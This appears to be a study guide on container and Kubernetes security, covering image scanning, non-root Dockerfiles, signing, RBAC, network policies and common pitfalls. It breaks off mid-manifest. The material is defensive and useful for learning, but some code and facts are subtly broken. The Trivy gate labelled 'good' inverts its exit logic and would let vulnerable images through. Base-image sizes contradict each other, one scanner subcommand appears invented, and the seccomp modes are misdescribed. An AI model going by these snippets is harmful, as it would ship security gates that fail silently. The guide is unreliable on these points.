# Container Security Fundamentals, Runtime Container Security, Kubernetes Security Fundamentals & Advanced Kubernetes Security Study Guide

## Table of Contents

- [Introduction](#introduction)
  - [Overview of Topic](#overview-of-topic)
  - [Why It Matters in Modern DevOps Platforms](#why-it-matters-in-modern-devops-platforms)
  - [Real-World Production Use Cases](#real-world-production-use-cases)
  - [Where It Typically Appears in Cloud Architecture](#where-it-typically-appears-in-cloud-architecture)
- [Foundational Concepts](#foundational-concepts)
  - [Key Terminology](#key-terminology)
  - [Architecture Fundamentals](#architecture-fundamentals)
  - [Important DevOps Principles](#important-devops-principles)
  - [Best Practices Overview](#best-practices-overview)
  - [Common Misunderstandings](#common-misunderstandings)
- [Container Security Fundamentals](#container-security-fundamentals)
- [Runtime Container Security](#runtime-container-security)
- [Kubernetes Security Fundamentals](#kubernetes-security-fundamentals)
- [Advanced Kubernetes Security](#advanced-kubernetes-security)
- [Hands-on Scenarios](#hands-on-scenarios)
- [Interview Questions](#interview-questions)

---

## Introduction

### Overview of Topic

Container security and Kubernetes security represent the critical intersection of infrastructure security, application deployment, and operational resilience in modern cloud-native environments. This study guide addresses the complete security lifecycle from container image construction through orchestration and runtime enforcement—spanning four interconnected domains:

1. **Container Security Fundamentals**: The foundational layer encompassing image integrity, dependency management, and containerization best practices
2. **Runtime Container Security**: The execution-time protections including kernel-level restrictions, capability management, and behavioral monitoring
3. **Kubernetes Security Fundamentals**: The cluster-level primitives including authentication, authorization, and workload isolation
4. **Advanced Kubernetes Security**: Enterprise-grade security patterns including policy enforcement, service mesh integration, and supply chain security

Container and Kubernetes security is not monolithic—it's a multi-layered defense strategy requiring expertise across multiple domains including Linux kernel features, container runtimes, orchestration platforms, networking, compliance, and threat modeling.

### Why It Matters in Modern DevOps Platforms

**Threat Landscape Evolution**

The shift from monolithic VMs to containerized microservices fundamentally changed the security perimeter. Traditional host-based security assumptions (fixed, known, long-lived assets) dissolve in an environment with:
- Thousands of ephemeral containers with distinct vulnerability profiles
- Rapid deployment cycles reducing time for security validation
- Shared kernel architecture creating blast radius concerns
- Complex inter-service communication patterns expanding the attack surface
- Increased third-party dependencies in OCI images

**Business Impact of Container Breaches**

Security failures in containerized environments lead to:
- **Supply chain compromises**: Malicious dependencies propagating across deployments
- **Data exfiltration**: Unauthorized access to multi-tenant resources through container escapes
- **Denial of service**: Resource exhaustion attacks disrupting cluster stability
- **Regulatory violations**: Non-compliance with HIPAA, PCI-DSS, SOC 2 in Kubernetes workloads
- **Operational cascading**: Single compromised container potentially affecting 100+ downstream services

**DevOps-Specific Challenges**

Container and Kubernetes security operates at the intersection of speed and safety:
- Deployment velocity conflicts with security scanning windows
- Declarative infrastructure requires policy-driven automation (not manual gates)
- Distributed architectures demand new observability patterns for security
- Multi-tenancy on shared clusters requires strict isolation
- GitOps workflows require supply chain security from commit to execution

### Real-World Production Use Cases

**Case Study: Financial Services Multi-Tenant Platform**

A tier-1 financial services company running 500+ containerized microservices across 3 regions discovered that 18% of running containers had **high-severity CVEs**. The challenge: updating containers requires coordinated deployment schedules across dependent services. Solution required:
- Automated image scanning in CI/CD with CVE threshold gates
- Runtime admission controls blocking vulnerable images
- Pod Security Standards enforcing non-root execution
- Network policies segmenting payment processing from UI services
- Regular `kubectl top` auditing revealing resource hogging indicating noisy neighbor issues

**Case Study: SaaS Provider with Multi-Tenant Isolation Requirements**

A B2B SaaS platform serving competing enterprises needed to guarantee security isolation between tenants sharing a single Kubernetes cluster. Threats included:
- Lateral movement from compromised container to neighboring tenant workloads
- Resource exhaustion attacks consuming cluster capacity
- RBAC misconfiguration allowing cross-namespace visibility
- Network policy gaps enabling east-west traffic between tenants

Solution involved:
- Strict seccomp profiles restricting syscall surface per workload
- Network policies implementing zero-trust between namespaces
- ResourceQuotas limiting noisy neighbor impact
- Pod Security exceptions documented for compliance audits
- Service mesh mTLS encrypting all inter-pod communication

**Case Study: Supply Chain Security in CI/CD**

An e-commerce platform suffered a breach when a malicious npm package (injected through compromised CI/CD credentials) built into their Docker image. The attack went undetected through 3 deployments affecting 50,000+ users. Remediation required:
- Image scanning with SBOM generation for bill of materials tracking
- Signed container images with cryptographic verification
- OPA policies blocking images without valid signatures
- Runtime threat detection identifying suspicious syscall patterns
- Regular container image audits identifying outdated base images

### Where It Typically Appears in Cloud Architecture

Container and Kubernetes security is present in multiple layers of modern cloud architectures:

```
┌─────────────────────────────────────────────────────────┐
│                  SUPPLY CHAIN SECURITY                  │
│  (Code repo → Registry → Orchestration → Runtime)       │
├─────────────────────────────────────────────────────────┤
│ DEVELOPMENT PHASE                                       │
│ └─ Container image building (Dockerfile)                │
│ └─ Image scanning and vulnerability detection            │
│ └─ SBOM generation and dependency tracking              │
├─────────────────────────────────────────────────────────┤
│ REGISTRY & DISTRIBUTION                                 │
│ └─ Image signing and attestation                        │
│ └─ Access controls and audit logging                    │
│ └─ Registry scanning during storage                     │
├─────────────────────────────────────────────────────────┤
│ ORCHESTRATION LAYER (Kubernetes)                        │
│ └─ Admission controllers                                │
│ └─ RBAC and authentication                              │
│ └─ Network policies and service mesh                    │
│ └─ Pod security standards                               │
├─────────────────────────────────────────────────────────┤
│ RUNTIME ENFORCEMENT                                     │
│ └─ Seccomp and capability restrictions                  │
│ └─ Runtime threat detection                             │
│ └─ Behavioral monitoring and anomaly detection          │
├─────────────────────────────────────────────────────────┤
│ COMPLIANCE & AUDIT                                      │
│ └─ Multi-tenancy verification                           │
│ └─ Regulatory requirement enforcement                   │
│ └─ Forensic analysis capabilities                       │
└─────────────────────────────────────────────────────────┘
```

**Typical Enterprise Architecture Manifestation:**

In a production Kubernetes deployment, container and Kubernetes security manifests across:
- **Developer Local Environments**: Image building with local security scans
- **CI/CD Pipeline**: Automated vulnerability scanning, SBOM generation, image signing
- **Container Registry**: Access controls, image signing verification, runtime scanning
- **Kubernetes Cluster**: API server authentication/authorization, admission webhooks, pod security policies
- **CNI/Service Mesh**: Network policy enforcement, encrypted service-to-service communication
- **Node Level**: Runtime security agents, seccomp profiles, AppArmor/SELinux policies
- **Observability Stack**: Security event logging, threat detection, compliance auditing

---

## Foundational Concepts

### Key Terminology

#### Container Runtime
The software that executes container workloads and manages the container lifecycle. Primary implementations:
- **containerd**: Industry standard, used by Docker, Kubernetes, and most modern platforms
- **cri-o**: RedHat-maintained, Kubernetes-specific runtime
- **Docker**: Legacy (uses containerd underneath); primarily a packaging/tooling layer
- **runC**: Low-level OCI-compliant runtime (underlying containerd and cri-o)

**DevOps Context**: Container runtime selection affects security tooling availability, vulnerability response timelines, and cluster operational stability.

#### OCI (Open Container Initiative)
Standards body defining:
- **Image Spec**: Container image format, layers, metadata, digests
- **Runtime Spec**: Container execution behavior, security context, lifecycle
- **Distribution Spec**: Image transfer, registry protocols, authentication

**Security Implication**: OCI compliance ensures portable security across registries and runtimes; violations can create exploitable inconsistencies.

#### Image vs. Container
- **Image**: Static, immutable template containing filesystem, configuration, metadata (stored in registry)
- **Container**: Running instance of an image with isolated process namespace, network namespace, storage mounts

**Security Distinction**: Vulnerabilities in images don't manifest until the container runs; runtime context and access controls determine exploitability.

#### Vulnerability Scanning
Automated identification of known CVEs in container images using:
- **Static scanning**: Analyzing image layers without execution
- **Dynamic scanning**: Behavioral analysis during container execution

**Categories Scanned**:
- OS package vulnerabilities (apt, yum repositories)
- Application dependencies (npm, pip, Maven packages)
- Base image vulnerabilities
- Misconfigurations in image definition

#### Seccomp (Secure Computing)
Linux kernel feature restricting syscalls available to a process. Modes:
- **Permissive**: Monitor syscalls (log-only, useful for profiling)
- **Strict**: Block non-whitelisted syscalls (enforce security boundary)

**Container-level enforcement**: Kubernetes applies seccomp profiles via annotations or Pod Security Standards.

#### Capabilities
Fine-grained Linux privileges decoupled from uid=0 (root). Examples:
- `CAP_NET_RAW`: Create raw sockets (often unnecessary in containers)
- `CAP_SYS_ADMIN`: System administration privileges (container escape vector)
- `CAP_SYS_PTRACE`: Debug processes (unnecessary in production)

**Container default**: Most capabilities are dropped by modern container runtimes; application must explicitly request needed capabilities.

#### RBAC (Role-Based Access Control) in Kubernetes
API-level access control defining:
- **Roles**: Sets of API verbs on resource types (e.g., "list pods", "delete services")
- **RoleBindings**: Assignments of roles to users/service accounts
- **Scoping**: Namespace-level (Role/RoleBinding) or cluster-wide (ClusterRole/ClusterRoleBinding)

**Multi-tenancy Implication**: Misconfigured RBAC can allow tenant-A to inspect/modify tenant-B resources.

#### Pod Security Context
Kubernetes specification defining security attributes for a pod:
- `runAsUser`: UID the container process runs as
- `runAsNonRoot`: Boolean enforcing non-root execution
- `readOnlyRootFilesystem`: Prevent write access to root filesystem
- `allowPrivilegeEscalation`: Boolean allowing uid=0 elevation
- `capabilities`: Add/drop Linux capabilities

**Admission Control Mechanism**: Pod Security Standards evaluate pod security contexts against predefined profiles.

#### Network Policies
Kubernetes NetworkPolicy resource implementing microsegmentation:
- Default-deny ingress/egress model
- Label-based pod selection
- Namespace-level or cluster-wide scoping
- CNI-dependent implementation (not all CNIs support all features)

**Critical Distinction**: Network policies are not firewalls; they're intra-cluster traffic policies supplemented by (not replacing) traditional perimeter firewalls.

#### Admission Controllers
Kubernetes API server hooks evaluating/modifying requests before persistence. Types:
- **Validating**: Reject non-compliant requests
- **Mutating**: Transform requests to meet security requirements
- **Webhook-based**: External services controlling admission

**Examples**:
- Pod Security Standards (built-in validating)
- OPA/Kyverno (policy-based, webhook-driven)
- Image signature verification (webhook)

#### Service Mesh
Dedicated infrastructure layer decoupling application code from network behavior:
- **Proxies**: Sidecar containers intercepting pod traffic
- **Control Plane**: Configuration management for proxies
- **mTLS**: Automatic encryption and authentication between services

**Security Benefit**: Encryption and mutual authentication without application code changes.

#### SBOM (Software Bill of Materials)
Machine-readable inventory of all components in a container image:
- Base OS packages
- Application dependencies
- Metadata (version, licenses, CVE data)

**Compliance & Supply Chain**: Required for regulatory compliance (US Executive Order on Cybersecurity), enabling rapid response to CVEs affecting supply chain.

### Architecture Fundamentals

#### The Container Execution Model

**Isolation Mechanisms**

Containers achieve isolation through Linux namespaces and cgroups:

```
┌─────────────────────────────────────┐
│ CONTAINER PROCESS (PID 1)           │
├─────────────────────────────────────┤
│ Namespace: PID                      │ Process isolation
│ Namespace: Network                  │ Interface, routing, firewall
│ Namespace: IPC                      │ Message queues, shared memory
│ Namespace: UTS                      │ Hostname, NIS domain
│ Namespace: Mount                    │ Filesystem mounts
│ Namespace: User (optional)          │ UID/GID mapping
│ Namespace: Cgroup                   │ Resource limits
├─────────────────────────────────────┤
│ Cgroups: CPU, Memory, Disk I/O      │ Resource quotas
│ Security: Seccomp, AppArmor/SELinux │ Capability/syscall restrictions
└─────────────────────────────────────┘
```

**Security Implications**:
- **Incomplete isolation**: Shared kernel means kernel bugs affect all containers
- **Escape vectors**: Privileged syscalls (CAP_SYS_ADMIN) can bypass isolation
- **Resource contention**: Noisy neighbor affecting performance/availability (not security)
- **Cross-container observability**: Processes can sometimes observe sibling containers through /proc filesystem

#### Kubernetes Threat Model

Kubernetes operates on assumption of **comprehensive threat coverage** across four layers:

**Layer 1: External Threats**
- Attackers outside the cluster network
- Defense: Network perimeter firewalls, WAF, API-level authentication

**Layer 2: Unauthorized Internal Access**
- Legitimate users exceeding their authorization scope
- Defense: RBAC, audit logging, least-privilege service accounts

**Layer 3: Compromised Workload Lateral Movement**
- Attacker compromises application container, attempts lateral movement to other services
- Defense: Network policies, Pod Security Standards, service mesh encryption

**Layer 4: Malicious Container Image**
- Attacker embeds exploit in container image during build/push
- Defense: Image scanning, signature verification, admission controllers

#### Multi-Tenancy Architecture in Kubernetes

Kubernetes is not inherently multi-tenant—multi-tenancy must be architecturally enforced:

**Soft Multi-Tenancy** (Different teams within same organization)
- Namespace-level isolation with RBAC
- Resource quotas preventing noisy neighbor
- Network policies for traffic isolation
- Risk: Misconfiguration easily allows cross-tenant access

**Hard Multi-Tenancy** (Competing customers)
- Separate clusters (secure, expensive)
- OR: Multiple layers of controls—RBAC, Pod Security Standards, Network Policies, service mesh, separate storage, resource quotas, pod-level network isolation with gVisor/Kata runtimes

**Practical Reality**: Most "multi-tenant" production deployments implement soft multi-tenancy with selective components of hard multi-tenancy based on tenant risk profiles.

#### Supply Chain Security Flow

Container security begins before the container is built:

```
                    CODE COMMIT
                        ↓
                  GIT REPOSITORY
                        ↓
          ┌─────────────────────────┐
          │ PRE-BUILD ANALYSIS      │
          │ - Code scanning         │
          │ - Dependency audit      │
          └─────────────────────────┘
                        ↓
         ┌─────────────────────────────┐
         │ DOCKERFILE & BASE IMAGE     │
         │ - Alpine/UBI preferred      │
         │ - Minimal dependencies      │
         │ - Non-root user            │
         └─────────────────────────────┘
                        ↓
         ┌─────────────────────────────┐
         │ BUILD & SCAN               │
         │ - Compile, layer creation  │
         │ - Vulnerability scanning   │
         │ - SBOM generation          │
         │ - Image signing            │
         └─────────────────────────────┘
                        ↓
         ┌─────────────────────────────┐
         │ REGISTRY                    │
         │ - Signature verification   │
         │ - Access controls          │
         │ - Re-scanning (periodic)   │
         └─────────────────────────────┘
                        ↓
         ┌─────────────────────────────┐
         │ DEPLOYMENT (Kubernetes)    │
         │ - Admission control        │
         │ - Signature verification   │
         │ - Pod Security Standards   │
         │ - Network policy attach    │
         └─────────────────────────────┘
                        ↓
         ┌─────────────────────────────┐
         │ RUNTIME ENFORCEMENT        │
         │ - Seccomp/capabilities     │
         │ - Behavioral monitoring    │
         │ - Threat detection         │
         └─────────────────────────────┘
```

### Important DevOps Principles

#### 1. Shift-Left Security
Move security validation earlier in the development lifecycle:

**Traditional Model** (Shift-Right):
```
Code → Build → Test → Deploy → Runtime Detection
                                     ↑
                        Late remediation (expensive)
```

**Shift-Left Model**:
```
Code Scan → Dependency Audit → Image Scan → Build → Deploy
   ↓
Early remediation (99% cheaper than production incidents)
```

**Implementation**:
- Pre-commit hooks scanning code for secrets, insecure patterns
- Dependency scanning in CI/CD before image build
- Image scanning blocking deployment of vulnerable images
- SBOM generation enabling rapid CVE response

#### 2. Defense in Depth
Multi-layered security so compromise of one layer doesn't compromise the system:

**Anti-pattern**:
```
Single layer (e.g., "just use Pod Security Standards")
↓
Misconfiguration → Complete compromise
```

**Proper Implementation**:
```
Layer 1: Image scanning + signature verification
Layer 2: Admission controller validation
Layer 3: Pod Security Standards + network policies
Layer 4: Seccomp + capability restrictions
Layer 5: Runtime threat detection
↓
Compromise of one layer ≠ system compromise
```

#### 3. Principle of Least Privilege
Every workload, user, and component has **minimum** necessary permissions:

**Container Level**:
- Drop all capabilities, add only required ones (`CAP_NET_BIND_SERVICE` for ports < 1024)
- Run as non-root uid with dedicated service account
- Read-only root filesystem where possible
- No privileged mode

**Kubernetes API Level**:
- Service accounts with minimal role bindings
- Separate service accounts per application (not default account)
- Namespace-level isolation with RBAC
- Network policies default-deny with explicit allow rules

**Operational Impact**: Legitimate applications may require relaxed constraints; documentation and risk acceptance required.

#### 4. Immutability & Reproducibility
Container images and configurations must be reproducible and immutable:

**Image Immutability**:
- All images referenced by digest (hash), never mutable tags like `latest`
- Image signing ensures authenticity and integrity
- Recreating image from same source produces identical hash
- Runtime verification ensures deployment hash matches expected hash

**Kubernetes Configuration Immutability**:
- Infrastructure as Code (manifests in Git with audit)
- Kubectl apply idempotency (applying same manifest multiple times produces same state)
- No imperative kubectl commands in production (kubectl set image violates IaC principle)
- All changes tracked and reviewable

#### 5. Observability as a Security Practice
Security decisions require data—observability enables informed risk management:

**Required Visibility**:
- Container image sources and update frequency
- Vulnerability lifecycle (discovered → patched → deployed)
- Runtime syscall patterns (baseline vs. anomaly detection)
- Network traffic (expected vs. suspicious connections)
- RBAC access patterns (who accessed what, when, why)
- Admission controller decisions (rejected vs. allowed requests)

**Bridge Between Dev and Security**:
- Developers understand performance/observability
- Apply same principles to security observability
- Security events require same SLO/alerting as operational metrics

### Best Practices Overview

#### Container Image Best Practices

**1. Minimal Base Images**
- Use UBI (Universal Base Image), Alpine, or Distroless images
- Rationale: Reduced attack surface, faster scanning, smaller deployment sizes
- Example: `ubi-minimal:9.0` ~150MB vs. `ubuntu:22.04` ~80MB

**2. Non-Root User**
```dockerfile
# Bad
RUN application-installer
# Application runs as root

# Good
RUN useradd -m appuser && chown -R appuser:appuser /app
USER appuser
CMD ["application"]
# Application runs as uid 1000, cannot modify system
```

**3. Read-Only Root Filesystem**
- Set `readOnlyRootFilesystem: true` in pod security context
- Forces application to use ephemeral volumes (`/tmp` via emptyDir) for temporary data
- Prevents runtime modification attacks

**4. Explicit Package Versions**
```dockerfile
# Bad
RUN apt-get install curl postgresql-client

# Good
RUN apt-get install curl=7.81.0-1ubuntu1 postgresql-client=13.10-1
# Deterministic, reviewable upgrades
```

**5. Multi-Stage Builds**
```dockerfile
FROM golang:1.20 as builder
COPY *.go /src/
RUN CGO_ENABLED=0 go build -o /app

FROM scratch
COPY --from=builder /app /app
CMD ["/app"]
# Final image ~10MB vs. ~900MB single-stage
```

#### Container Scanning Strategy

**1. Multiple Scanning Tools**
- No single tool catches all vulnerabilities
- Different tools use different CVE databases, scoring algorithms
- Industry practice: Trivy + Anchore/Grype combination
- Kubernetes-native: Falco + Sysdig

**2. Baseline + Ongoing Scanning**
- Initial scan: Build-time (CI/CD, gate on critical/high)
- Ongoing scan: Registry (detect new CVEs in stored images)
- Runtime scan: Kernel/syscall anomalies (active exploitation attempts)

**3. Response Automation**
- Policy: Images with critical CVEs never validated for deployment
- Automation: Admission controller rejects non-whitelisted images
- Escalation: Alert on new CVEs in production-running images

### Common Misunderstandings

#### Misunderstanding 1: "Containers are lightweight VMs"

**Reality**: Containers share the host kernel; VM-like isolation is incomplete.

**Implication**:
- Kernel exploits affect all containers (not isolated like VMs)
- Cannot run arbitrary guest kernels (unlike Docker Desktop VirtualBox backend)
- Resource limits are cgroup-enforced, not hardware-isolated
- Proper security model: defense-in-depth, not single isolation layer

**Correct Framing**: Containers are **process-isolated workloads** with namespace separation, not kernel-isolated.

#### Misunderstanding 2: "Container scanning finds all vulnerabilities"

**Reality**: Scanners detect known CVEs; unknown vulnerabilities, misconfigurations, and logical bugs are not detected.

**Blind Spots**:
- Zero-day vulnerabilities (not in CVE databases)
- Insecure application code (not a known CVE)
- Configuration vulnerabilities (readable secrets in environment)
- Supply chain compromise (malicious but not-yet-flagged dependencies)
- Runtime behavior anomalies (detected via behavior analysis, not static scanning)

**Correct Framing**: Scanning is **one layer** of defense-in-depth; assume breaches and detect them at runtime.

#### Misunderstanding 3: "Network policies provide firewall-like security"

**Reality**: Network policies are intra-cluster microsegmentation; they don't protect against:
- Threats already inside the cluster
- DDoS from external traffic (rate-limiting, not network policies)
- Application-layer attacks (policies work at L3/L4, not L7)

**Limitation**: Network policies don't protect cluster API server, etcd, or kubelet—attacks on control plane components are not mitigated by workload network policies.

**Correct Framing**: Network policies are **in-cluster traffic segmentation**, not perimeter security.

#### Misunderstanding 4: "RBAC protects against compromised containers"

**Reality**: RBAC controls API server access; a compromised container gaining access to its service account's RBAC role can perform those actions.

**Scenario**:
```
Pod with service account "payment-processor"
Payment-processor role has: list, get, watch services in default namespace

Attacker compromises pod → Obtains $KUBECONFIG/SA token
Attacker can: list/get/watch services
Attacker cannot: delete services, modify RBAC

But attacker CAN enumerate target services for lateral movement
```

**Correct Framing**: RBAC is defense-in-depth; minimum least-privilege RBAC reduces (not eliminates) damage from compromised containers.

#### Misunderstanding 5: "Pod Security Standards are sufficient security policy"

**Reality**: Pod Security Standards cover only pod-level controls; they don't enforce:
- Image source/signature validation (admission controller required)
- Cluster API access restrictions (RBAC required)
- Network traffic policies (network policies required)
- Supply chain integrity (image scanning + signature verification required)
- Runtime behavior (behavioral monitoring required)

**Correct Framing**: Pod Security Standards are **one component** of security; proper security requires multiple layers.

#### Misunderstanding 6: "Kubernetes is more secure than VMs"

**Reality**: Architecture trades:
- **Kubernetes advantage**: Rapid security patching (rolling updates, not VM reboots)
- **Kubernetes disadvantage**: Shared kernel, more moving parts, API complexity
- Proper setup: Kubernetes can be as secure or more secure than VMs, but requires more expertise

**Correct Framing**: Kubernetes security requires **different** approaches than VM security, not necessarily better or worse.

#### Misunderstanding 7: "Secrets in environment variables are secure"

**Reality**: Environment variables accessible via:
- `/proc/[pid]/environ` (readable from other processes in same pod)
- `ps aux` (if pod operator has shell access)
- Container inspect/describe (accessible to RBAC role with pod/get)
- Logs (secrets accidentally logged and indexed in logging system)

**Best Practice**: Use external secret management (HashiCorp Vault, AWS Secrets Manager with IRSA), not environment variables.

---

---

## Container Security Fundamentals

### Textual Deep Dive

#### Internal Working Mechanism

**Container Image Architecture**

Container images are composed of **layered filesystems** stored in the registry:

```
Base Image (OS packages, runtime, etc.)
    ↓
Layer 1: Application dependencies
    ↓
Layer 2: Application code
    ↓
Layer 3: Configuration
    ↓
Container Image (combined layers + metadata)
```

Each layer is independently stored with a SHA256 digest (hash). When pushed to a registry, unchanged layers are deduplicated. When a container is instantiated, the union filesystem combines all layers into a single coherent view.

**Security Implication**: A vulnerability in any layer affects all derived images. Example: Ubuntu base image CVE 2023-4911 (glibc overflow) affects thousands of derived images until they rebuild with patched base layer.

**Image Scanning Mechanics**

Vulnerability scanning follows this sequence:

```
Container Image (layers + manifest)
    ↓
Layer extraction and filesystem analysis
    ↓
Package detection (dpkg, rpm, apk, pip, npm databases)
    ↓
Package version comparison against CVE databases
    ↓
Severity scoring (CVSS, NVD, supplier-specific)
    ↓
Report generation (SBOM, JSON, etc.)
```

**Database Sources**:
- **National Vulnerability Database (NVD)**: Official CVE catalog with CVSS scoring
- **Debian Security Advisories**: Debian-specific security fixes
- **RedHat Security Advisories**: RedHat/CentOS package security information
- **Grype/Syft databases**: Community-maintained aggregations
- **Vendor-specific**: Microsoft, Canonical, Alpine security advisories

**Limitation**: Scanners rely on known vulnerability databases. Zero-day vulnerabilities, misconfigurations, and logic bugs are not detected via static scanning.

**Non-Root Container Execution**

**Linux User Model**:
- `uid 0` (root): Unrestricted privileges, system-wide access
- `uid > 0` (non-root): Limited privileges, restricted syscalls, namespace isolation

**Container Context**:
```
Dockerfile:
USER appuser          # uid 1000
ENTRYPOINT ["app"]

At runtime:
- Process executes with uid 1000
- Cannot access /etc/shadow (requires CAP_DAC_OVERRIDE)
- Cannot bind to ports < 1024 (requires CAP_NET_BIND_SERVICE)
- Privilege escalation attempts (setuid binaries) are restricted
```

**Privilege Escalation Vectors (mitigated by non-root)**:
1. `setuid` binaries: Executable flag grants temporary uid elevation (blocked for non-root owner)
2. `sudo` misconfigurations: Requires root to configure (not executable by non-root)
3. Capability escalation: Requires CAP_SYS_ADMIN or similar (dropped by default)

**Production Impact**: Applications requiring uid 0 should be isolated in separate containers with explicit security review.

**Image Signing & Verification**

**Signature Mechanism**:
- Image digest (SHA256 of image manifest) is signed with private key
- Signature + public key stored in registry (registries vary in support)
- At deployment, admission controller verifies signature using public key

**Trust Model**:
```
Developer → Private Key
   Signature: sign(image_digest, private_key) → Signature value
   ↓
Registry stores: image_digest + signature
   ↓
Kubernetes admission controller
   → Retrieve image public key from trusted keyring
   → Verify signature: verify(image_digest, signature, public_key)
   → If valid: Allow deployment
   → If invalid: Reject deployment
```

**Multi-Signature Support**: An image can be signed by multiple parties (e.g., vendor signature + internal security team signature), enabling verification chains.

**Limitations of Current Implementations**:
- Most registries don't persistently store signatures (require external systems like Notary v2)
- Sigstore (emerging standard) aims to standardize but adoption is nascent
- Private registries often lack signature support entirely

#### Architecture Role

Container security fundamentals form the **first defensive layer** in cloud-native security. This layer operates at:
- **Build time**: Creating images with minimal attack surface
- **Storage time**: Maintaining image integrity in registry
- **Pull time**: Validating images before deployment

**Responsibility Mapping**:

| Role | Responsibility |
|------|-----------------|
| **Application Developer** | Write secure Dockerfile, run image scans, report findings |
| **DevOps Engineer** | Implement scanning gates in CI/CD, maintain base image standards, manage image registries |
| **Security Team** | Define vulnerability thresholds, establish policy for signing, audit scanning results |
| **Platform Operations** | Enforce admission controllers, maintain registry security, monitor supply chain |

#### Production Usage Patterns

**Pattern 1: Gated Image Promotion**

```
Developer push → CI/CD build
    ↓
Automated scan → Critical/High block deployment
             → Medium/Low generate SLA ticket (remediate within 30 days)
    ↓
Security review gate (for critical findings)
    ↓
Approved image → Registry "production" namespace
    ↓
Manual promotion to production by change control
```

**Operational Benefit**: Catches vulnerabilities before production; allows risk-based decisions for known issues.

**Pattern 2: Minimal Base Image Standardization**

Organizations establish base image standards:

```
Approved Base Images:
- UBI 9.0 minimal (security updates every 2 weeks)
- Alpine 3.18 (less frequent updates, community maintained)
- Custom-built minimal (OS packages + company standard tools)

Enforcement:
- CI/CD scans against approved base images
- Admission controller blocks non-approved base images
- Quarterly review of base image CVE status
```

**Operational Benefit**: Reduced scanning noise, rapid security updates propagation.

**Pattern 3: SBOM-Driven Rapid Response**

When a critical CVE is announced:

```
CVE published (e.g., OpenSSL RCE)
    ↓
Query SBOM database: "Which production images contain vulnerable OpenSSL?"
    ↓
Trigger automated rebuilds with patched package
    ↓
Admission controller allows only rebuilt+scanned images
    ↓
Automatic pod replacement (rolling update)
    ↓
Verify new images in production, retire old images
```

**Timeline**: From CVE announcement to production deployment: 2-4 hours vs. 24-48 hours without SBOM automation.

#### DevOps Best Practices

**1. Base Image Selection Strategy**

| Image Type | Size | Update Cadence | Security| Use Case |
|-----------|------|----------------|---------|---------| 
| Ubuntu   | ~77MB| Weekly        | Good   | General Linux tools |
| UBI      | ~70MB| Bi-weekly     | Excellent | Enterprise Kubernetes |
| Alpine   | ~7MB | Monthly       | Good   | Minimal deployments |
| Distroless| ~5MB| Weekly        | Excellent | Statically-linked apps |
| Scratch  | 0B   | N/A           | N/A    | Single binary apps |

**Decision Matrix**:
- **Distroless**: Python/Go/Java apps (package managers not needed post-build)
- **Alpine**: Shell scripts, need apk package manager
- **UBI**: Enterprise support required, FIPS compliance, RHEL compatibility
- **Scratch**: Only if application is single compiled binary (unusual)

**2. Multi-Stage Build Pattern**

```dockerfile
# This pattern reduces final image size by 90%+ and reduces attack surface

# Stage 1: Build environment (large, temporary)
FROM golang:1.20-alpine as builder
RUN apk add --no-cache ca-certificates tzdata
COPY . /app
WORKDIR /app
RUN CGO_ENABLED=0 GOOS=linux go build -o app .

# Stage 2: Runtime environment (minimal)
FROM scratch
COPY --from=builder /app/app /
COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/
COPY --from=builder /usr/share/zoneinfo /usr/share/zoneinfo
ENTRYPOINT ["/app"]

# Result: 900MB (single-stage) → 12MB (multi-stage)
```

**Security Benefits**:
- Build tools (compiler, git) never included in deployed images
- Reduced CVE surface (fewer packages = fewer vulnerabilities)
- Smaller = faster deployment, faster scanning

**3. Explicit Package Versions**

```dockerfile
# Bad: Versions float, non-deterministic builds
RUN apt-get install -y curl postgresql-client

# Good: Pinned versions, any rebuild is identical
RUN apt-get install -y \
    curl=7.81.0-1ubuntu1.13 \
    postgresql-client=13.10-1

# Best: Pinned versions + APT lock
RUN apt-get install -y --no-install-recommends \
    curl=7.81.0-1ubuntu1.13 \
    && rm -rf /var/lib/apt/lists/*
```

**Operational Benefit**: Security teams can track which versions are deployed, patch management is deliberate not accidental.

**4. Container Scanning Before Registry Admission**

```bash
#!/bin/bash
# CI/CD integration: scan before registry push

IMAGE="${1:-myapp:latest}"
SEVERITY_THRESHOLD="HIGH"

# Scan with Trivy
trivy image --severity="${SEVERITY_THRESHOLD}" "${IMAGE}" > /tmp/scan.json

# Exit code: 0 no issues, 1 found issues
if [ $? -ne 0 ]; then
    echo "❌ Image contains ${SEVERITY_THRESHOLD} vulnerabilities"
    cat /tmp/scan.json
    exit 1
fi

echo "✓ Scan passed, proceeding to registry push"
docker push "${IMAGE}"
```

**5. SBOM Generation & Tracking**

```bash
# Generate SBOM at build time
syft "${IMAGE}" -o spdx-json > sbom.spdx.json

# Store SBOM in registry (OCI 1.1 spec)
oras push "${REGISTRY}/${IMAGE}:sbom" sbom.spdx.json

# Later: Query SBOM for rapid response to CVEs
jq '.packages[] | select(.name=="openssl")' sbom.spdx.json
```

#### Common Pitfalls

**Pitfall 1: Using `latest` Tag in Production**

```dockerfile
# ❌ Bad: Latest pulls float over time
FROM alpine:latest

# Rebuild 6 months later → Different base image, possibly different vulnerabilities
# Tracking which image actually runs is impossible
```

**Fix**: Pin base image to specific version
```dockerfile
# ✓ Good: Reproducible
FROM alpine:3.18.0
```

**Pitfall 2: Ineffective Scanning Thresholds**

```bash
# ❌ Bad: Warns but doesn't enforce
trivy image myapp:1.0
trivy image myapp:1.0 | grep HIGH
# Administrator ignores output, image still deployed

# ✓ Good: Automatic enforcement
# CI/CD fails if HIGH findings exist
if trivy image --exit-code 1 --severity HIGH myapp:1.0; then
    exit 1  # Block deployment
fi
```

**Pitfall 3: Scanning Only at Build Time**

```bash
# ❌ Bad: One-time scan
docker build -t myapp:1.0 . && trivy image myapp:1.0

# After 6 months: New CVEs discovered in dependencies
# Old images still running, unaware of vulnerabilities
```

**Fix**: Continuous registry scanning
```bash
# Triggered daily/weekly
trivy image-registry scan ${REGISTRY}/${IMAGE}:1.0
# Alerts if new CVEs found
```

**Pitfall 4: Running as Root**

```dockerfile
# ❌ Bad: Container runs as uid 0
FROM ubuntu:22.04
RUN apt-get install myapp
ENTRYPOINT ["myapp"]
# Application inherits root privileges; exfiltration achieves system compromise

# ✓ Good: Explicit non-root user
FROM ubuntu:22.04
RUN useradd -m appuser && \
    apt-get install myapp && \
    chown -R appuser:appuser /app
USER appuser
ENTRYPOINT ["myapp"]
# Application uid 1000; privilege escalation required for system compromise
```

**Pitfall 5: Not Verifying Image Signatures**

```yaml
# ❌ Bad: No signature enforcement
apiVersion: v1
kind: Pod
metadata:
  name: myapp
spec:
  containers:
